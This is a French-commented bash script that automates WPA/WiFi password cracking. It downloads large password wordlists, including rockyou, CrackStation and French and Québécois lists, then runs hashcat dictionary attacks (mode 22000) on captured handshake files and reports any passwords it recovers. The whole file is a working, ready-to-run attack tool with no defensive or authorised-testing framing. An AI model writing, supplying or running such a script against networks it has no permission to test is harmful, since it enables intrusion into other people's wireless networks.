#!/usr/bin/env bash
# ============================================================================
#  crack_v3.sh — Download dicts + dictionary-only attack
#  Toutes les URLs vérifiées. Argument order hashcat corrigé.
#  Usage: ./crack_v3.sh
# ============================================================================

CAPTURES_DIR="./captures"
DICTS_DIR="./dicts"
RULES_DIR="./rules"
RESULTS_DIR="./results"
MODE=22000
WORKLOAD=4

GREEN='\033[0;32m'; YELLOW='\033[1;33m'; RED='\033[0;31m'
CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'
log()  { echo -e "${GREEN}[+]${NC} $*"; }
warn() { echo -e "${YELLOW}[!]${NC} $*"; }
err()  { echo -e "${RED}[✗]${NC} $*"; }

dl() {
    wget -q --show-progress --timeout=60 -O "$2" "$1" 2>&1 \
        || curl -L --connect-timeout 60 -o "$2" "$1" 2>&1
}

mkdir -p "$CAPTURES_DIR" "$DICTS_DIR" "$RULES_DIR" "$RESULTS_DIR"

echo -e "${CYAN}${BOLD}"
echo "  ╔═══════════════════════════════════════════════════════╗"
echo "  ║  crack_v3 — Download + Dictionary Attack (mode $MODE) ║"
echo "  ╚═══════════════════════════════════════════════════════╝"
echo -e "${NC}"

# ── GPU check ──
nvidia-smi --query-gpu=name,memory.total --format=csv,noheader 2>/dev/null \
    && echo "" || warn "Pas de GPU détecté"

# ════════════════════════════════════════════════════════════════════════
#  ÉTAPE 1 : TÉLÉCHARGEMENT (skip si déjà présent)
# ════════════════════════════════════════════════════════════════════════

echo -e "\n${BOLD}═══ ÉTAPE 1 : TÉLÉCHARGEMENT DES DICOS ═══${NC}\n"

# --- FR ciblés ---
[ -f "$DICTS_DIR/richelieu-1k.txt" ] \
    || dl "https://raw.githubusercontent.com/tarraschk/richelieu/master/french_passwords_top1000.txt" \
          "$DICTS_DIR/richelieu-1k.txt"
log "richelieu-1k ✓"

[ -f "$DICTS_DIR/richelieu-5k.txt" ] \
    || dl "https://raw.githubusercontent.com/tarraschk/richelieu/master/french_passwords_top5000.txt" \
          "$DICTS_DIR/richelieu-5k.txt"
log "richelieu-5k ✓"

[ -f "$DICTS_DIR/richelieu-20k.txt" ] \
    || dl "https://raw.githubusercontent.com/tarraschk/richelieu/master/french_passwords_top20000.txt" \
          "$DICTS_DIR/richelieu-20k.txt"
log "richelieu-20k ✓"

[ -f "$DICTS_DIR/wpa-top4800.txt" ] \
    || dl "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt" \
          "$DICTS_DIR/wpa-top4800.txt"
log "wpa-top4800 ✓"

[ -f "$DICTS_DIR/keyboard_walk_fr.txt" ] \
    || dl "https://raw.githubusercontent.com/clem9669/wordlists/master/keyboard_walk_fr" \
          "$DICTS_DIR/keyboard_walk_fr.txt"
log "keyboard_walk_fr ✓"

[ -f "$DICTS_DIR/prenoms_fr.txt" ] \
    || dl "https://raw.githubusercontent.com/clem9669/wordlists/master/prenoms_fr" \
          "$DICTS_DIR/prenoms_fr.txt"
log "prenoms_fr ✓"

[ -f "$DICTS_DIR/dictionnaire_fr.txt" ] \
    || dl "https://raw.githubusercontent.com/clem9669/wordlists/master/dictionnaire_fr" \
          "$DICTS_DIR/dictionnaire_fr.txt"
log "dictionnaire_fr ✓"

[ -f "$DICTS_DIR/french-words.txt" ] \
    || dl "https://raw.githubusercontent.com/lorenbrichter/Words/master/Words/fr.txt" \
          "$DICTS_DIR/french-words.txt"
log "french-words ✓"

[ -f "$DICTS_DIR/quebec.txt" ] \
    || dl "https://raw.githubusercontent.com/w0lf-d3n/Quebec_Wordlist/main/quebec.txt" \
          "$DICTS_DIR/quebec.txt"
log "quebec ✓"

# --- Universels ---
[ -f "$DICTS_DIR/seclists-10k.txt" ] \
    || dl "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt" \
          "$DICTS_DIR/seclists-10k.txt"
log "seclists-10k ✓"

[ -f "$DICTS_DIR/probable-12k.txt" ] \
    || dl "https://raw.githubusercontent.com/berzerk0/Probable-Wordlists/master/Real-Passwords/Top12Thousand-probable-v2.txt" \
          "$DICTS_DIR/probable-12k.txt"
log "probable-12k ✓"

[ -f "$DICTS_DIR/darkc0de.txt" ] \
    || dl "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/darkc0de.txt" \
          "$DICTS_DIR/darkc0de.txt"
log "darkc0de ✓"

[ -f "$DICTS_DIR/rockyou.txt" ] \
    || dl "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt" \
          "$DICTS_DIR/rockyou.txt"
log "rockyou ✓"

# CrackStation (le gros, ~258 Mo compressé → ~700 Mo)
if [ ! -f "$DICTS_DIR/crackstation-human.txt" ]; then
    log "CrackStation human-only (~258 Mo gz)... patiente"
    dl "https://crackstation.net/files/crackstation-human-only.txt.gz" \
       "$DICTS_DIR/crackstation-human.txt.gz"
    gunzip -f "$DICTS_DIR/crackstation-human.txt.gz" 2>/dev/null && log "crackstation décompressé ✓"
fi
log "crackstation-human ✓"

# clem9669 compilé (~240 Mo 7z → ~1 Go)
if [ ! -f "$DICTS_DIR/clem9669-small.txt" ]; then
    log "clem9669 small (~240 Mo 7z)... patiente"
    dl "https://github.com/clem9669/wordlists/releases/download/115/clem9669_wordlist_small.7z" \
       "$DICTS_DIR/clem9669_small.7z"
    if command -v 7z > /dev/null 2>&1; then
        7z x "$DICTS_DIR/clem9669_small.7z" -o"$DICTS_DIR" -aoa > /dev/null 2>&1
        find "$DICTS_DIR" -maxdepth 1 -name "clem9669_wordlist_small*" ! -name "*.7z" \
            -exec mv {} "$DICTS_DIR/clem9669-small.txt" \; 2>/dev/null
        rm -f "$DICTS_DIR/clem9669_small.7z"
        log "clem9669-small décompressé ✓"
    else
        apt-get install -y -qq p7zip-full > /dev/null 2>&1
        7z x "$DICTS_DIR/clem9669_small.7z" -o"$DICTS_DIR" -aoa > /dev/null 2>&1
        find "$DICTS_DIR" -maxdepth 1 -name "clem9669_wordlist_small*" ! -name "*.7z" \
            -exec mv {} "$DICTS_DIR/clem9669-small.txt" \; 2>/dev/null
        rm -f "$DICTS_DIR/clem9669_small.7z"
        log "clem9669-small décompressé ✓"
    fi
fi
log "clem9669-small ✓"

# ── Résumé dicos ──
echo ""
log "Dictionnaires téléchargés :"
for f in "$DICTS_DIR"/*.txt; do
    [ -f "$f" ] || continue
    lines=$(wc -l < "$f" 2>/dev/null)
    size=$(du -h "$f" | cut -f1)
    printf "  %-30s %'10d lignes  (%s)\n" "$(basename "$f")" "$lines" "$size"
done

# ════════════════════════════════════════════════════════════════════════
#  ÉTAPE 2 : ATTAQUE DICTIONNAIRE PURE
# ════════════════════════════════════════════════════════════════════════

echo -e "\n${BOLD}═══ ÉTAPE 2 : ATTAQUE DICTIONNAIRE ═══${NC}\n"

# Chercher les fichiers .22000
CAPTURE_FILES=$(find "$CAPTURES_DIR" -name "*.22000" 2>/dev/null)

if [ -z "$CAPTURE_FILES" ]; then
    err "Aucun fichier .22000 trouvé dans $CAPTURES_DIR/"
    err "Place tes fichiers .22000 dedans et relance."
    exit 1
fi

log "Fichiers .22000 :"
echo "$CAPTURE_FILES" | while read -r f; do echo "  → $(basename "$f")"; done
echo ""

# Ordre des dicos : petits FR d'abord, puis gros universels
DICT_ORDER="
wpa-top4800.txt
richelieu-1k.txt
richelieu-5k.txt
seclists-10k.txt
probable-12k.txt
richelieu-20k.txt
keyboard_walk_fr.txt
prenoms_fr.txt
french-words.txt
dictionnaire_fr.txt
quebec.txt
darkc0de.txt
rockyou.txt
clem9669-small.txt
crackstation-human.txt
"

# Attaque : pour chaque capture, tester chaque dico
echo "$CAPTURE_FILES" | while read -r capture; do
    capname=$(basename "$capture" .22000)
    potfile="$RESULTS_DIR/${capname}.potfile"
    outfile="$RESULTS_DIR/${capname}_found.txt"

    echo ""
    echo -e "${BOLD}╔════════════════════════════════════════════════╗${NC}"
    echo -e "${BOLD}║  ${CYAN}${capname}${NC}${BOLD}$(printf '%*s' $((40 - ${#capname})) '')║${NC}"
    echo -e "${BOLD}╚════════════════════════════════════════════════╝${NC}"
    echo ""

    # Vérifier si déjà cracké
    if hashcat -m $MODE "$capture" --show --potfile-path "$potfile" 2>/dev/null | grep -q ":"; then
        echo -e "  ${GREEN}${BOLD}🎉 DÉJÀ CRACKÉ !${NC}"
        hashcat -m $MODE "$capture" --show --potfile-path "$potfile" 2>/dev/null
        continue
    fi

    found=0
    for dictname in $DICT_ORDER; do
        dict="$DICTS_DIR/$dictname"
        [ -f "$dict" ] || continue

        # Skip si déjà trouvé
        if [ "$found" -eq 1 ]; then break; fi

        log "Testing: ${YELLOW}${dictname}${NC}"

        # ════════════════════════════════════════════════════
        # HASHCAT : hashcat [options] HASHFILE WORDLIST
        #           capture = hashfile, dict = wordlist
        # ════════════════════════════════════════════════════
        hashcat -m $MODE -a 0 \
            -w "$WORKLOAD" \
            --optimized-kernel-enable \
            --potfile-path "$potfile" \
            --outfile "$outfile" \
            --outfile-format 2 \
            "$capture" \
            "$dict" \
            2>&1 | tail -5

        # Vérifier résultat
        if hashcat -m $MODE "$capture" --show --potfile-path "$potfile" 2>/dev/null | grep -q ":"; then
            echo ""
            echo -e "  ${GREEN}${BOLD}🎉 MOT DE PASSE TROUVÉ avec ${dictname} !${NC}"
            hashcat -m $MODE "$capture" --show --potfile-path "$potfile" 2>/dev/null
            echo ""
            found=1
        fi
    done

    if [ "$found" -eq 0 ]; then
        warn "Aucun dico n'a matché pour ${capname}"
        warn "→ Prochaine étape : relancer avec des règles de mutation"
    fi
done

# ── Résumé final ──
echo ""
echo -e "${BOLD}════════════════════════════════════════════════════${NC}"
echo -e "${BOLD}  RÉSUMÉ FINAL${NC}"
echo -e "${BOLD}════════════════════════════════════════════════════${NC}"
echo ""

echo "$CAPTURE_FILES" | while read -r capture; do
    capname=$(basename "$capture" .22000)
    potfile="$RESULTS_DIR/${capname}.potfile"
    if hashcat -m $MODE "$capture" --show --potfile-path "$potfile" 2>/dev/null | grep -q ":"; then
        result=$(hashcat -m $MODE "$capture" --show --potfile-path "$potfile" 2>/dev/null | tail -1)
        echo -e "  ${GREEN}✓${NC} ${capname} → ${BOLD}${result}${NC}"
    else
        echo -e "  ${RED}✗${NC} ${capname} → non trouvé (dico only)"
    fi
done

echo ""
log "Résultats détaillés dans $RESULTS_DIR/"
echo ""
